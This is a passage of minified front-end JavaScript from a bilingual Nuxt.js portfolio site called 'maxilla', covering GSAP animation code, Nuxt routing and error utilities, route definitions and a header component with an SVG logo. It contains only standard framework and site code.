this._firstPT=this._overwrittenProps=this._startAt=this._onUpdate=null,this._notifyPluginsOfEnabled=this._active=this._lazy=!1,this._propLookup=this._targets?{}:[],P.prototype.invalidate.call(this),this.vars.immediateRender&&(this._time=-1e-8,this.render(t,!1,!1!==this.vars.lazy)),this},s._enabled=function(t,e){if(c||l.wake(),t&&this._gc){var i,n=this._targets;if(n)for(i=n.length;--i>-1;)this._siblings[i]=J(n[i],this,!0);else this._siblings=J(this.target,this,!0)}return P.prototype._enabled.call(this,t,e),!(!this._notifyPluginsOfEnabled||!this._firstPT)&&C._onPluginEvent(t?"_onEnable":"_onDisable",this)},C.to=function(t,e,i){return new C(t,e,i)},C.from=function(t,e,i){return i.runBackwards=!0,i.immediateRender=0!=i.immediateRender,new C(t,e,i)},C.fromTo=function(t,e,i,n){return n.startAt=i,n.immediateRender=0!=n.immediateRender&&0!=i.immediateRender,new C(t,e,n)},C.delayedCall=function(t,e,i,n,r){return new C(e,0,{delay:t,onComplete:e,onCompleteParams:i,callbackScope:n,onReverseComplete:e,onReverseCompleteParams:i,immediateRender:!1,lazy:!1,useFrames:r,overwrite:0})},C.set=function(t,e){return new C(t,0,e)},C.getTweensOf=function(t,e){if(null==t)return[];var i,n,r,a;if(t="string"!=typeof t?t:C.selector(t)||t,(_(t)||R(t))&&"number"!=typeof t[0]){for(i=t.length,n=[];--i>-1;)n=n.concat(C.getTweensOf(t[i],e));for(i=n.length;--i>-1;)for(a=n[i],r=i;--r>-1;)a===n[r]&&n.splice(i,1)}else if(t._gsTweenID)for(i=(n=J(t).concat()).length;--i>-1;)(n[i]._gc||e&&!n[i].isActive())&&n.splice(i,1);return n||[]},C.killTweensOf=C.killDelayedCallsTo=function(t,e,i){"object"===Object(r.a)(e)&&(i=e,e=!1);for(var n=C.getTweensOf(t,e),a=n.length;--a>-1;)n[a]._kill(i,t)};var it=x("plugins.TweenPlugin",(function(t,e){this._overwriteProps=(t||"").split(","),this._propName=this._overwriteProps[0],this._priority=e||0,this._super=it.prototype}),!0);if(s=it.prototype,it.version="1.19.0",it.API=2,s._firstPT=null,s._addTween=B,s.setRatio=D,s._kill=function(t){var e,i=this._overwriteProps,n=this._firstPT;if(null!=t[this._propName])this._overwriteProps=[];else for(e=i.length;--e>-1;)null!=t[i[e]]&&i.splice(e,1);for(;n;)null!=t[n.n]&&(n._next&&(n._next._prev=n._prev),n._prev?(n._prev._next=n._next,n._prev=null):this._firstPT===n&&(this._firstPT=n._next)),n=n._next;return!1},s._mod=s._roundProps=function(t){for(var e,i=this._firstPT;i;)(e=t[this._propName]||null!=i.n&&t[i.n.split(this._propName+"_").join("")])&&"function"==typeof e&&(2===i.f?i.t._applyPT.m=e:i.m=e),i=i._next},C._onPluginEvent=function(t,e){var i,n,r,a,o,s=e._firstPT;if("_onInitAllProps"===t){for(;s;){for(o=s._next,n=r;n&&n.pr>s.pr;)n=n._next;(s._prev=n?n._prev:a)?s._prev._next=s:r=s,(s._next=n)?n._prev=s:a=s,s=o}s=e._firstPT=r}for(;s;)s.pg&&"function"==typeof s.t[t]&&s.t[t]()&&(i=!0),s=s._next;return i},it.activate=function(t){for(var e=t.length;--e>-1;)t[e].API===it.API&&(W[(new t[e])._propName]=t[e]);return!0},y.plugin=function(t){if(!(t&&t.propName&&t.init&&t.API))throw"illegal plugin definition.";var e,i=t.propName,n=t.priority||0,r=t.overwriteProps,a={init:"_onInitTween",set:"setRatio",kill:"_kill",round:"_mod",mod:"_mod",initAll:"_onInitAllProps"},o=x("plugins."+i.charAt(0).toUpperCase()+i.substr(1)+"Plugin",(function(){it.call(this,i,n),this._overwriteProps=r||[]}),!0===t.global),s=o.prototype=new it(i);for(e in s.constructor=o,o.API=t.API,a)"function"==typeof t[e]&&(s[a[e]]=t[e]);return o.version=t.version,it.activate([o]),o},a=t._gsQueue){for(o=0;o<a.length;o++)a[o]();for(s in g)g[s].func||t.console.log("GSAP encountered missing dependency: "+s)}return c=!1,C}(a),s=a.GreenSockGlobals,l=s.com.greensock,c=l.core.SimpleTimeline,h=l.core.Animation,u=s.Ease,d=s.Linear,p=d,f=s.Power1,m=s.Power2,_=s.Power3,g=s.Power4,v=s.TweenPlugin,y=l.events.EventDispatcher}.call(this,i(242)(t),i(43))},,function(t,e,i){"use strict";i.d(e,"i",(function(){return c})),i.d(e,"j",(function(){return h})),i.d(e,"a",(function(){return u})),i.d(e,"n",(function(){return d})),i.d(e,"e",(function(){return p})),i.d(e,"f",(function(){return f})),i.d(e,"c",(function(){return m})),i.d(e,"h",(function(){return g})),i.d(e,"o",(function(){return v})),i.d(e,"k",(function(){return y})),i.d(e,"m",(function(){return x})),i.d(e,"d",(function(){return b})),i.d(e,"b",(function(){return w})),i.d(e,"g",(function(){return T})),i.d(e,"l",(function(){return S})),i(53),i(31),i(33),i(195),i(60),i(41),i(42),i(72),i(139);var n=i(51),r=(i(22),i(7)),a=(i(36),i(35),i(9),i(5),i(21),i(4),i(11)),o=i(2);function s(t,e){var i=Object.keys(t);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(t);e&&(n=n.filter((function(e){return Object.getOwnPropertyDescriptor(t,e).enumerable}))),i.push.apply(i,n)}return i}function l(t){for(var e=1;e<arguments.length;e++){var i=null!=arguments[e]?arguments[e]:{};e%2?s(i,!0).forEach((function(e){Object(a.a)(t,e,i[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(t,Object.getOwnPropertyDescriptors(i)):s(i).forEach((function(e){Object.defineProperty(t,e,Object.getOwnPropertyDescriptor(i,e))}))}return t}function c(t){o.a.config.errorHandler&&o.a.config.errorHandler(t)}function h(t){return t.then((function(t){return t.default||t}))}function u(t,e){if(e||!t.options.__hasNuxtData){var i=t.options._originDataFn||t.options.data||function(){return{}};t.options._originDataFn=i,t.options.data=function(){var n=i.call(this,this);return this.$ssrContext&&(e=this.$ssrContext.asyncData[t.cid]),l({},n,{},e)},t.options.__hasNuxtData=!0,t._Ctor&&t._Ctor.options&&(t._Ctor.options.data=t.options.data)}}function d(t){return t.options&&t._Ctor===t||(t.options?(t._Ctor=t,t.extendOptions=t.options):(t=o.a.extend(t))._Ctor=t,!t.options.name&&t.options.__file&&(t.options.name=t.options.__file)),t}function p(t){var e=arguments.length>1&&void 0!==arguments[1]&&arguments[1],i=arguments.length>2&&void 0!==arguments[2]?arguments[2]:"components";return Array.prototype.concat.apply([],t.matched.map((function(t,n){return Object.keys(t[i]).map((function(r){return e&&e.push(n),t[i][r]}))})))}function f(t){return p(t,arguments.length>1&&void 0!==arguments[1]&&arguments[1],"instances")}function m(t,e){return Array.prototype.concat.apply([],t.matched.map((function(t,i){return Object.keys(t.components).reduce((function(n,r){return t.components[r]?n.push(e(t.components[r],t.instances[r],t,r,i)):delete t.components[r],n}),[])})))}function _(t,e){return Promise.all(m(t,(function(t,i,n,r){return regeneratorRuntime.async((function(a){for(;;)switch(a.prev=a.next){case 0:if("function"!=typeof t||t.options){a.next=4;break}return a.next=3,regeneratorRuntime.awrap(t());case 3:t=a.sent;case 4:return n.components[r]=t=d(t),a.abrupt("return","function"==typeof e?e(t,i,n,r):t);case 6:case"end":return a.stop()}}))})))}function g(t){return regeneratorRuntime.async((function(e){for(;;)switch(e.prev=e.next){case 0:if(t){e.next=2;break}return e.abrupt("return");case 2:return e.next=4,regeneratorRuntime.awrap(_(t));case 4:return e.abrupt("return",l({},t,{meta:p(t).map((function(e,i){return l({},e.options.meta,{},(t.matched[i]||{}).meta)}))}));case 5:case"end":return e.stop()}}))}function v(t,e){var i,a,o,s;return regeneratorRuntime.async((function(l){for(;;)switch(l.prev=l.next){case 0:return t.context||(t.context={isStatic:!0,isDev:!1,isHMR:!1,app:t,store:t.store,payload:e.payload,error:e.error,base:"/",env:{}},e.req&&(t.context.req=e.req),e.res&&(t.context.res=e.res),e.ssrContext&&(t.context.ssrContext=e.ssrContext),t.context.redirect=function(e,i,n){if(e){t.context._redirected=!0;var a=Object(r.a)(i);if("number"==typeof e||"undefined"!==a&&"object"!==a||(n=i||{},i=e,a=Object(r.a)(i),e=302),"object"===a&&(i=t.router.resolve(i).route.fullPath),!/(^[.]{1,2}\/)|(^\/(?!\/))/.test(i))throw i=A(i,n),window.location.replace(i),new Error("ERR_REDIRECT");t.context.next({path:i,query:n,status:e})}},t.context.nuxtState=window.__NUXT__),l.next=3,regeneratorRuntime.awrap(Promise.all([g(e.route),g(e.from)]));case 3:i=l.sent,a=Object(n.a)(i,2),o=a[0],s=a[1],e.route&&(t.context.route=o),e.from&&(t.context.from=s),t.context.next=e.next,t.context._redirected=!1,t.context._errored=!1,t.context.isHMR=!1,t.context.params=t.context.route.params||{},t.context.query=t.context.route.query||{};case 15:case"end":return l.stop()}}))}function y(t,e){return!t.length||e._redirected||e._errored?Promise.resolve():x(t[0],e).then((function(){return y(t.slice(1),e)}))}function x(t,e){var i;return(i=2===t.length?new Promise((function(i){t(e,(function(t,n){t&&e.error(t),i(n=n||{})}))})):t(e))&&i instanceof Promise&&"function"==typeof i.then?i:Promise.resolve(i)}function b(t,e){var i=decodeURI(window.location.pathname);return"hash"===e?window.location.hash.replace(/^#\//,""):(t&&0===i.indexOf(t)&&(i=i.slice(t.length)),(i||"/")+window.location.search+window.location.hash)}function w(t,e){return function(t){for(var e=new Array(t.length),i=0;i<t.length;i++)"object"===Object(r.a)(t[i])&&(e[i]=new RegExp("^(?:"+t[i].pattern+")$"));return function(i,n){for(var r="",a=i||{},o=(n||{}).pretty?E:encodeURIComponent,s=0;s<t.length;s++){var l=t[s];if("string"!=typeof l){var c=a[l.name||"pathMatch"],h=void 0;if(null==c){if(l.optional){l.partial&&(r+=l.prefix);continue}throw new TypeError('Expected "'+l.name+'" to be defined')}if(Array.isArray(c)){if(!l.repeat)throw new TypeError('Expected "'+l.name+'" to not repeat, but received `'+JSON.stringify(c)+"`");if(0===c.length){if(l.optional)continue;throw new TypeError('Expected "'+l.name+'" to not be empty')}for(var u=0;u<c.length;u++){if(h=o(c[u]),!e[s].test(h))throw new TypeError('Expected all "'+l.name+'" to match "'+l.pattern+'", but received `'+JSON.stringify(h)+"`");r+=(0===u?l.prefix:l.delimiter)+h}}else{if(h=l.asterisk?E(c,!0):o(c),!e[s].test(h))throw new TypeError('Expected "'+l.name+'" to match "'+l.pattern+'", but received "'+h+'"');r+=l.prefix+h}}else r+=l}return r}}(function(t,e){for(var i,n=[],r=0,a=0,o="",s=e&&e.delimiter||"/";null!=(i=M.exec(t));){var l=i[0],c=i[1],h=i.index;if(o+=t.slice(a,h),a=h+l.length,c)o+=c[1];else{var u=t[a],d=i[2],p=i[3],f=i[4],m=i[5],_=i[6],g=i[7];o&&(n.push(o),o="");var v=null!=d&&null!=u&&u!==d,y="+"===_||"*"===_,x="?"===_||"*"===_,b=i[2]||s,w=f||m;n.push({name:p||r++,prefix:d||"",delimiter:b,optional:x,repeat:y,partial:v,asterisk:Boolean(g),pattern:w?k(w):g?".*":"[^"+L(b)+"]+?"})}}return a<t.length&&(o+=t.substr(a)),o&&n.push(o),n}(t,e))}function T(t,e){var i={},n=l({},t,{},e);for(var r in n)String(t[r])!==String(e[r])&&(i[r]=!0);return i}function S(t){var e;if(t.message||"string"==typeof t)e=t.message||t;else try{e=JSON.stringify(t,null,2)}catch(i){e="[".concat(t.constructor.name,"]")}return l({},t,{message:e,statusCode:t.statusCode||t.status||t.response&&t.response.status||500})}window.onNuxtReadyCbs=[],window.onNuxtReady=function(t){window.onNuxtReadyCbs.push(t)};var M=new RegExp(["(\\\\.)","([\\/.])?(?:(?:\\:(\\w+)(?:\\(((?:\\\\.|[^\\\\()])+)\\))?|\\(((?:\\\\.|[^\\\\()])+)\\))([+*?])?|(\\*))"].join("|"),"g");function E(t,e){var i=e?/[?#]/g:/[/?#]/g;return encodeURI(t).replace(i,(function(t){return"%"+t.charCodeAt(0).toString(16).toUpperCase()}))}function L(t){return t.replace(/([.+*?=^!:${}()[\]|/\\])/g,"\\$1")}function k(t){return t.replace(/([=!:$/()])/g,"\\$1")}function A(t,e){var i,r=t.indexOf("://");-1!==r?(i=t.substring(0,r),t=t.substring(r+3)):t.startsWith("//")&&(t=t.substring(2));var a,o=t.split("/"),s=(i?i+"://":"//")+o.shift(),l=o.filter(Boolean).join("/");if(2===(o=l.split("#")).length){var c=o,h=Object(n.a)(c,2);l=h[0],a=h[1]}return s+=l?"/"+l:"",e&&"{}"!==JSON.stringify(e)&&(s+=(2===t.split("?").length?"&":"?")+function(t){return Object.keys(t).sort().map((function(e){var i=t[e];return null==i?"":Array.isArray(i)?i.slice().map((function(t){return[e,"=",t].join("")})).join("&"):e+"="+i})).filter(Boolean).join("&")}(e)),s+(a?"#"+a:"")}},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,function(t,e,i){"use strict";i.r(e),i.d(e,"loadLanguageAsync",(function(){return o})),i.d(e,"validateRouteParams",(function(){return l})),i.d(e,"getLocaleDomain",(function(){return c})),i.d(e,"getLocaleFromRoute",(function(){return h})),i.d(e,"syncVuex",(function(){return u})),i(29),i(72),i(4),i(33);var n=i(51),r=(i(9),i(5),i(228),i(7)),a=(i(109),i(71),i(84),i(36),i(0));function o(t,e){var i,n;return regeneratorRuntime.async((function(r){for(;;)switch(r.prev=r.next){case 0:(i=t.app).i18n.loadedLanguages||(i.i18n.loadedLanguages=[]),i.i18n.loadedLanguages.includes(e)||(n=i.i18n.locales.find((function(t){return t[a.b]===e})))&&n[a.d];case 3:case"end":return r.stop()}}))}var s=function(t){return t&&!Array.isArray(t)&&"object"===Object(r.a)(t)},l=function(t){s(t)&&Object.entries(t).forEach((function(t){var e=Object(n.a)(t,2),i=e[0],r=e[1];a.p.includes(i)&&s(r)}))},c=function(t,e){var i=(t.forwardedHost,window.location.href.split("/")[2]);if(i){var n=t.locales.find((function(t){return t[a.c]===i}));if(n)return n[a.b]}return null},h=function(){var t=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},e="(".concat(a.p.join("|"),")"),i="(?:".concat(a.t).concat(a.k,")?");if(t.name){var n=new RegExp("".concat(a.t).concat(e).concat(i,"$"),"i"),r=t.name.match(n);if(r&&r.length>1)return r[1]}else if(t.path){var o=new RegExp("^/".concat(e,"/"),"i"),s=t.path.match(o);if(s&&s.length>1)return s[1]}return null},u=function(t){var e,i,n=arguments;return regeneratorRuntime.async((function(r){for(;;)switch(r.prev=r.next){case 0:if(e=n.length>1&&void 0!==n[1]?n[1]:null,i=n.length>2&&void 0!==n[2]?n[2]:null,!a.w||!t){r.next=9;break}if(null===e||!a.w.syncLocale){r.next=6;break}return r.next=6,regeneratorRuntime.awrap(t.dispatch(a.w.moduleName+"/setLocale",e));case 6:if(null===i||!a.w.syncMessages){r.next=9;break}return r.next=9,regeneratorRuntime.awrap(t.dispatch(a.w.moduleName+"/setMessages",i));case 9:case"end":return r.stop()}}))}},,function(t,e,i){"use strict";i(53),i(31),i(9),i(21),i(5),i(36);var n=i(11),r=(i(4),i(2)),a=i(75),o=i(118),s=i.n(o),l=i(62),c=i.n(l),h=i(119),u=i(3),d=function(){return Object(u.j)(i.e(2).then(i.bind(null,284)))},p=function(){return Object(u.j)(i.e(3).then(i.bind(null,283)))},f=function(){return Object(u.j)(i.e(4).then(i.bind(null,282)))},m=function(){return Object(u.j)(i.e(6).then(i.bind(null,285)))},_=function(){return Object(u.j)(i.e(9).then(i.bind(null,287)))},g=function(){return Object(u.j)(i.e(8).then(i.bind(null,286)))},v=function(){return Object(u.j)(i.e(7).then(i.bind(null,280)))},y=function(){return Object(u.j)(i.e(5).then(i.bind(null,281)))};r.a.use(h.a);var x={mode:"history",base:decodeURI("/"),linkActiveClass:"nuxt-link-active",linkExactActiveClass:"nuxt-link-exact-active",scrollBehavior:function(t,e,i){return{x:0,y:0}},routes:[{path:"/404",component:d,name:"404___ja"},{path:"/en/404",component:d,name:"404___en"},{path:"/about",component:p,name:"about___ja"},{path:"/en/about",component:p,name:"about___en"},{path:"/contact",component:f,name:"contact___ja"},{path:"/en/contact",component:f,name:"contact___en"},{path:"/reel",component:m,name:"reel___ja"},{path:"/en/reel",component:m,name:"reel___en"},{path:"/works",component:_,name:"works___ja"},{path:"/works",component:_,name:"works___en"},{path:"/works/category/:slug?",component:g,name:"works-category-slug___ja"},{path:"/en/works/category/:slug?",component:g,name:"works-category-slug___en"},{path:"/works/:slug",component:v,name:"works-slug___ja"},{path:"/en/works/:slug",component:v,name:"works-slug___en"},{path:"/",component:y,name:"index___ja"},{path:"/",component:y,name:"index___en"}],fallback:!1},b={name:"NuxtChild",functional:!0,props:{nuxtChildKey:{type:String,default:""},keepAlive:Boolean,keepAliveProps:{type:Object,default:void 0}},render:function(t,e){var i=e.parent,n=e.data,r=e.props;n.nuxtChild=!0;for(var a=i,o=i.$nuxt.nuxt.transitions,s=i.$nuxt.nuxt.defaultTransition,l=0;i;)i.$vnode&&i.$vnode.data.nuxtChild&&l++,i=i.$parent;n.nuxtChildDepth=l;var c=o[l]||s,h={};w.forEach((function(t){void 0!==c[t]&&(h[t]=c[t])}));var u={};T.forEach((function(t){"function"==typeof c[t]&&(u[t]=c[t].bind(a))}));var d=u.beforeEnter;if(u.beforeEnter=function(t){if(window.$nuxt.$nextTick((function(){window.$nuxt.$emit("triggerScroll")})),d)return d.call(a,t)},!1===c.css){var p=u.leave;(!p||p.length<2)&&(u.leave=function(t,e){p&&p.call(a,t),a.$nextTick(e)})}var f=t("routerView",n);return r.keepAlive&&(f=t("keep-alive",{props:r.keepAliveProps},[f])),t("transition",{props:h,on:u},[f])}},w=["name","mode","appear","css","type","duration","enterClass","leaveClass","appearClass","enterActiveClass","enterActiveClass","leaveActiveClass","appearActiveClass","enterToClass","leaveToClass","appearToClass"],T=["beforeEnter","enter","afterEnter","enterCancelled","beforeLeave","leave","afterLeave","leaveCancelled","beforeAppear","appear","afterAppear","appearCancelled"],S={name:"NuxtError",props:{error:{type:Object,default:null}},head:function(){return{title:this.message,meta:[{name:"viewport",content:"width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no"}]}},computed:{statusCode:function(){return this.error&&this.error.statusCode||500},message:function(){return this.error.message||"Error"}}},M=(i(202),i(26)),E=Object(M.a)(S,(function(){var t=this,e=t.$createElement,i=t._self._c||e;return i("div",{staticClass:"__nuxt-error-page"},[i("div",{staticClass:"error"},[i("svg",{attrs:{xmlns:"http://www.w3.org/2000/svg",width:"90",height:"90",fill:"#DBE1EC",viewBox:"0 0 48 48"}},[i("path",{attrs:{d:"M22 30h4v4h-4zm0-16h4v12h-4zm1.99-10C12.94 4 4 12.95 4 24s8.94 20 19.99 20S44 35.05 44 24 35.04 4 23.99 4zM24 40c-8.84 0-16-7.16-16-16S15.16 8 24 8s16 7.16 16 16-7.16 16-16 16z"}})]),t._v(" "),i("div",{staticClass:"title"},[t._v(t._s(t.message))]),t._v(" "),404===t.statusCode?i("p",{staticClass:"description"},[i("NuxtLink",{staticClass:"error-link",attrs:{to:"/"}},[t._v("Back to the home page")])],1):t._e(),t._v(" "),t._m(0)])])}),[function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticClass:"logo"},[e("a",{attrs:{href:"https://nuxtjs.org",target:"_blank",rel:"noopener"}},[this._v("Nuxt.js")])])}],!1,null,null,null).exports,L=(i(41),i(42),i(22),i(51)),k={name:"Nuxt",components:{NuxtChild:b,NuxtError:E},props:{nuxtChildKey:{type:String,default:void 0},keepAlive:Boolean,keepAliveProps:{type:Object,default:void 0},name:{type:String,default:"default"}},errorCaptured:function(t){this.displayingNuxtError&&(this.errorFromNuxtError=t,this.$forceUpdate())},computed:{routerViewKey:function(){if(void 0!==this.nuxtChildKey||this.$route.matched.length>1)return this.nuxtChildKey||Object(u.b)(this.$route.matched[0].path)(this.$route.params);var t=Object(L.a)(this.$route.matched,1)[0];if(!t)return this.$route.path;var e=t.components.default;if(e&&e.options){var i=e.options;if(i.key)return"function"==typeof i.key?i.key(this.$route):i.key}return/\/$/.test(t.path)?this.$route.path:this.$route.path.replace(/\/$/,"")}},beforeCreate:function(){r.a.util.defineReactive(this,"nuxt",this.$root.$options.nuxt)},render:function(t){var e=this;return this.nuxt.err?this.errorFromNuxtError?(this.$nextTick((function(){return e.errorFromNuxtError=!1})),t("div",{},[t("h2","An error occured while showing the error page"),t("p","Unfortunately an error occured and while showing the error page another error occured"),t("p","Error details: ".concat(this.errorFromNuxtError.toString())),t("nuxt-link",{props:{to:"/"}},"Go back to home")])):(this.displayingNuxtError=!0,this.$nextTick((function(){return e.displayingNuxtError=!1})),t(E,{props:{error:this.nuxt.err}})):t("NuxtChild",{key:this.routerViewKey,props:this.$props})}},A=(i(35),i(204),i(30),i(63)),P={props:["user","lang"],methods:{onLangTransition:function(t){var e=t.target.querySelectorAll("a");if(e.length){var i=e[0].getAttribute("href");routeTransition.onLangTransition(this.$router,i)}},onNormalLogoTransition:function(){routeTransition.onNormalTransition("home")},onNormalTransition:function(t){routeTransition.onNormalTransition(t)},onMenuToggle:function(t){t.preventDefault(),styleMenu.__Flag_open__?styleMenu.onClose():styleMenu.onOpen()},onToggleEnter:function(t){frontGL.__LOGO__.onMouseLoEnter(),t.target.querySelectorAll(".t div").forEach((function(t,e){var i=new TimelineLite;i.to(t,.4,{x:"100%",delay:.1*e,ease:Power2.easeInOut}),i.set(t,{x:"-100%"}),i.to(t,.4,{x:"0%",ease:Power2.easeOut})}))},onMouseEnterLogo:function(){frontGL.__LOGO__.onMouseEnter()},onMouseMoveLogo:function(t){frontGL.__LOGO__.onMouseMove(t,t.target)},onMouseLeaveLogo:function(){frontGL.__LOGO__.onMouseLeave()}}},O={props:["user","pickups"],methods:{onDragStart:function(t){mouse.onDragStart(t)}}},C={props:["user","lang","pages"],methods:{onMenuTransition:function(t){var e=t.target.dataset.name;routeTransition.onMenuTransition(e)},onNormalTransition:function(t){routeTransition.onNormalTransition(t)},onMouseEnter:function(t){styleMenu.onMouseEnter(t)},onMouseLeave:function(t){styleMenu.onMouseLeave(t)}}};function R(t,e){var i=Object.keys(t);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(t);e&&(n=n.filter((function(e){return Object.getOwnPropertyDescriptor(t,e).enumerable}))),i.push.apply(i,n)}return i}var I={methods:{},components:{siteHeader:Object(M.a)(P,(function(){var t=this,e=t.$createElement,i=t._self._c||e;return i("header",{staticClass:"site-header"},[i("div",{staticClass:"logo-wrap side"},[i("div",{staticClass:"logo-body"},[i("h1",{staticClass:"logo-h1 ui-splash-in"},[i("nuxt-link",{staticClass:"logo-a flip-a-wrap js--hover no-events",attrs:{to:t.localePath("index")},nativeOn:{click:function(e){return t.onNormalTransition("home")}}},[i("span",{staticClass:"flip-a"},[i("span",{staticClass:"t"},[i("span",{staticClass:"f js--slide-down"},[i("span",{staticClass:"s"},[t._v("maxilla")])]),t._v(" "),i("span",{staticClass:"b ja"},[i("span",{staticClass:"s"},[t._v("マキシラ")])])])])])],1),t._v(" "),t.user.isMobile?t._e():i("div",{staticClass:"ui-lang ui-splash-in"},["ja"===t.lang?i("div",{staticClass:"ui-lang-a js--hover flip-a-wrap no-events",on:{click:t.onLangTransition}},[i("nuxt-link",{staticClass:"in flip-a ui-lang-ul",attrs:{to:t.switchLocalePath("en")}},[i("span",{staticClass:"t"},[i("span",{staticClass:"f js--slide-down"},[i("span",{staticClass:"s"},[t._v("en")])]),t._v(" "),i("span",{staticClass:"b"},[i("span",{staticClass:"s"},[t._v("en")])])])])],1):i("div",{staticClass:"ui-lang-a js--hover flip-a-wrap no-events",on:{click:t.onLangTransition}},[i("nuxt-link",{staticClass:"in flip-a ui-lang-ul",attrs:{to:t.switchLocalePath("ja")}},[i("span",{staticClass:"t"},[i("span",{staticClass:"f js--slide-down"},[i("span",{staticClass:"s"},[t._v("ja")])]),t._v(" "),i("span",{staticClass:"b"},[i("span",{staticClass:"s"},[t._v("ja")])])])])],1)])])]),t._v(" "),i("nuxt-link",{staticClass:"logo-icon js--hover side ui-fade-out",attrs:{to:t.localePath("index"),"aria-label":"maxilla"},nativeOn:{click:function(e){return t.onNormalLogoTransition(e)},mouseenter:function(e){return t.onMouseEnterLogo(e)},mousemove:function(e){return t.onMouseMoveLogo(e)},mouseleave:function(e){return t.onMouseLeaveLogo(e)}}},[i("div",{staticClass:"in"},[t.user.isDesktop?i("div",{staticClass:"logo-svg logo-img"}):i("svg",{staticClass:"logo-svg logo-svg-mobile",attrs:{viewBox:"0 0 100 100"}},[i("title",[t._v("maxilla")]),t._v(" "),i("path",{attrs:{d:"M70.1,48.5c-0.8-0.5-1.8-0.9-2.7-0.8c-0.9,0.1-0.6-0.1-0.3-0.1c0,0-0.8,0.1-1.5,0.4c-0.8,0.3-2.7,0.9-3.4,1.2 c-0.7,0.3-1.4,0.8-2.2,1.6c-0.9,0.9-1.2,1.4-1.9,1.9c-0.7,0.5-0.9,0.8-1.4,0.9c-0.6,0.1-0.4,0-0.2-0.5c0.2-0.4,0.7-1.4,1-1.9 c0.3-0.5,0.9-1.6,2.2-2.3c1.3-0.7,3.8-1.6,5.3-2.5c1.5-0.9,3.1-2.1,3.6-3.3c0.5-1.3,0.7-1.9,0-3.7c-0.7-1.8-1.3-3.5-1.6-4.3 c-0.3-0.7-1-2.3-1.3-2.5c-0.3-0.2-0.6-0.2-0.7-0.5c-0.1-0.3-1.2-3.9-1.9-4.9c-0.7-1-0.8-1.2-0.9-1.1c-0.1,0.1,0.2,1.2,0.3,1.7 c0.1,0.5,0.7,2.2,0.9,2.9c0.2,0.7,0.4,1.7,0.7,2.6c0.3,0.9,0.9,3.3,1.2,4.1c0.3,0.8,0.7,2,0.9,2.9c0.2,0.9,0.5,2.2-0.3,3.1 c-0.8,0.9-1.5,1.3-1.5,1.3s0.2-1.6-0.1-3.2c-0.3-1.5-0.1-2.3-0.2-3.2c-0.1-0.9-0.2-3-0.5-4.2c-0.3-1.2-0.7-2.1-1.1-2.5 c-0.4-0.4-0.4,0-0.2,0.4c0.2,0.5,0.8,3.1,0.8,3.7c0,0.7,0.1,2.2,0,2.7c-0.1,0.5,0,2.4,0,3c0.1,0.6,0.2,2.2,0,2.9 c-0.2,0.7,0,1.2-1.1,1.5c-1.1,0.3-2.6,0.8-3.5,1.4c-1,0.6-1.3,1-1.7,1.2c-0.3,0.2-0.9,0.5-1.2,0c-0.3-0.5-0.8-1.3-1.1-1.8 c-0.3-0.5-0.5-1.4-0.4-1.8c0.1-0.4-0.1-1.2-0.1-1.6c0-0.4,0-1.1-0.1-1.2c-0.2,0-0.3,0.3-0.3,0.9c0,0.7-0.1,1.3-0.2,1.8 c-0.1,0.4-0.3,1.5,0.1,2.3c0.4,0.9,0.9,1.7,1.1,2.3c0.2,0.6,0.3,1.3,0,1.4c-0.2,0.2-0.4,0.1-0.2,0c0.2-0.2,0.2-0.3,0-0.2 c-0.2,0.1-0.5,0.3-0.4,0.1c0.2-0.2-0.2,0.1-0.5,0.2c-0.3,0.1-0.8,0.1-1.3,0.2c0,0-0.9-0.4-2.2-0.4c-1.3,0-2.2,0.4-2.2,0.4 c-0.4-0.1-1-0.1-1.3-0.2c-0.3-0.1-0.7-0.4-0.5-0.2c0.2,0.2-0.2,0-0.4-0.1c-0.2-0.1-0.1,0,0,0.2c0.2,0.2,0,0.2-0.2,0 c-0.2-0.2-0.2-0.9,0-1.4c0.2-0.5,0.7-1.4,1.1-2.3c0.4-0.9,0.2-1.9,0.1-2.3c-0.1-0.4-0.1-1.1-0.2-1.8c0-0.7-0.2-1-0.3-0.9 c-0.2,0-0.1,0.8-0.1,1.2c0,0.4-0.2,1.2-0.1,1.6c0.1,0.4-0.2,1.3-0.4,1.8c-0.3,0.5-0.8,1.4-1.1,1.8c-0.3,0.5-0.8,0.2-1.2,0 c-0.3-0.2-0.7-0.6-1.7-1.2c-1-0.6-2.5-1.1-3.5-1.4c-1.1-0.3-0.9-0.8-1.1-1.5c-0.2-0.7,0-2.3,0-2.9s0.1-2.5,0-3 c-0.1-0.5,0.1-2.1,0-2.7c0-0.7,0.6-3.3,0.8-3.7c0.2-0.4,0.1-0.9-0.2-0.4c-0.4,0.4-0.8,1.3-1.1,2.5c-0.3,1.2-0.4,3.3-0.5,4.2 c-0.1,0.9,0,1.7-0.2,3.2c-0.3,1.5-0.1,3.2-0.1,3.2s-0.7-0.4-1.5-1.3c-0.8-0.9-0.5-2.2-0.3-3.1c0.2-0.9,0.6-2.2,0.9-2.9 c0.3-0.8,0.9-3.2,1.2-4.1c0.3-0.9,0.5-1.8,0.7-2.6c0.2-0.7,0.8-2.4,0.9-2.9c0.1-0.5,0.4-1.6,0.3-1.7c-0.1-0.1-0.2,0-0.9,1.1 c-0.7,1-1.8,4.6-1.9,4.9c-0.1,0.3-0.4,0.3-0.7,0.5c-0.3,0.2-1,1.8-1.3,2.5c-0.3,0.7-0.9,2.5-1.6,4.3c-0.7,1.8-0.5,2.4,0,3.7 c0.5,1.3,2.1,2.4,3.6,3.3c1.5,0.9,4,1.7,5.3,2.5c1.3,0.7,1.8,1.8,2.2,2.3c0.3,0.5,0.8,1.5,1,1.9c0.2,0.4,0.4,0.6-0.2,0.5 c-0.6-0.1-0.8-0.4-1.4-0.9c-0.7-0.5-1-1.1-1.9-1.9c-0.9-0.9-1.5-1.3-2.2-1.6c-0.7-0.3-2.6-0.9-3.4-1.2c-0.8-0.3-1.5-0.4-1.5-0.4 c0.3,0.1,0.6,0.3-0.3,0.1c-0.9-0.1-1.9,0.3-2.7,0.8C29,49,30.1,50.2,31,51.7c0.9,1.5,1.8,3,2.9,4.4c1.1,1.4,2.7,1.5,4,1.9 